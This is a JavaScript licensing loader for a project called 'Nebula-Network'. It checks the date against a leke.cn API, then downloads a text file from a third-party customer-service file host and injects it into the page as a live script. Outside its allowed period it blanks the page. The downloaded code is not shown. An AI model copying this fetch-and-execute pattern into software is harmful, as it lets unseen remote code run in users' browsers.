/*
*Aman - 194nb.com
*/
var startTime=1623556800000;
var startTimeText='2021年6月13日12:00';
var endTime=1664553600000;
var endTimeText='2022年10月1日00:00';

function startAuthorization(){
	var x=new XMLHttpRequest();
	x.responseType='json';
	x.timeout=10000;
	x.open('get','https://note.leke.cn/auth/hd/note/ajax/getNoteRecord.htm');
	x.send();
	x.onerror=function(){
		alert('当前网络状况不佳，请退出重新开启星网！');
		document.head.innerHTML='';
		document.body.innerHTML='';
		location.href=location.href;
	};
	x.onload=function(){
		if(x.response=='' || x.response==undefined){
			alert('当前网络状况不佳，请退出重新开启星网！');
			document.head.innerHTML='';
			document.body.innerHTML='';
			location.href=location.href;
		}else{
			if(x.response.currentTime>startTime && x.response.currentTime<endTime){
				alert('您好！\n\n"星网-Nebula-Network"项目代码已正常启用！\n\n您的使用期限是'+startTimeText+'至'+endTimeText+'，\n\n请注意体验时间！');
				getService();
				setTimeout('getAuthorization()',60000);
			}else{
				if(x.response.currentTime<=startTime){
					alert('该条代码暂未达到启用时间！\n\n启用时间为'+startTimeText);
				}else{
					alert('该条代码已经超出截止时间！\n\n截止时间为'+endTimeText);
				};
			};
		};
		x=null;
	};
};

function getService(){
	var x=new XMLHttpRequest();
	x.timeout=10000;
	x.open('get','https://fs-im-kefu.7moor.com/im/4d2c3f00-7d4c-11e5-af15-41bf63ae4ea0/2021-06-12_17:51:02/1623491462609/54993171.txt');
	x.send();
	x.onerror=function(){
		alert('当前网络状况不佳，请退出重新开启星网！');
		document.head.innerHTML='';
		document.body.innerHTML='';
		location.href=location.href;
	};
	x.onload=function(){
		if(x.response=='' || x.response==undefined){
			alert('当前网络状况不佳，请退出重新开启星网！');
			document.head.innerHTML='';
			document.body.innerHTML='';
			location.href=location.href;
		}else{
			var s=document.createElement('script');
			s.innerHTML=x.responseText;
			document.head.appendChild(s);
			s=null;
		};
		x=null;
	};
};

function getAuthorization(){
	var x=new XMLHttpRequest();
	x.responseType='json';
	x.timeout=10000;
	x.open('get','https://note.leke.cn/auth/hd/note/ajax/getNoteRecord.htm');
	x.send();
	x.onerror=function(){
		alert('当前网络状况不佳，请退出重新开启星网！');
		document.head.innerHTML='';
		document.body.innerHTML='';
		location.href=location.href;
	};
	x.onload=function(){
		if(x.response=='' || x.response==undefined){
			alert('当前网络状况不佳，请退出重新开启星网！');
			document.head.innerHTML='';
			document.body.innerHTML='';
			location.href=location.href;
		}else{
			if(x.response.currentTime>startTime && x.response.currentTime<endTime){
			}else{
				alert('很抱歉！\n\n当前未处于该条代码的使用期限内！');
				document.head.innerHTML='';
				document.body.innerHTML='';
				location.href=location.href;
			};
		};
		x=null;
		setTimeout('getAuthorization()',60000);
	};
};

startAuthorization();